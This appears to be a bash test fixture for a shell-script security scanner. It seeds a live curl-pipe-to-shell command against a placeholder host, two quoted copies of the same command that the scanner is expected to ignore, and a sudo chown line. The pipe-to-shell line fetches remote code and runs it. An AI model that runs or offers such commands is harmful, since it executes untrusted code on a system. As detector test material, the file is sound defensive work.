#!/bin/bash
# Seed C1 (Critical, Pipe to shell) — real match, not in an echo or heredoc.
curl -fsSL https://example.invalid/install | sh

# Seed D1 (dropped) — echo containing the same signature must NOT be reported.
echo "curl https://example.invalid/x | sh"

# Seed D2 (dropped) — heredoc containing the same signature must NOT be reported.
cat <<'EOF'
curl https://example.invalid/y | sh
EOF

# Seed H1 (High, sudo)
sudo chown root /tmp/seeded
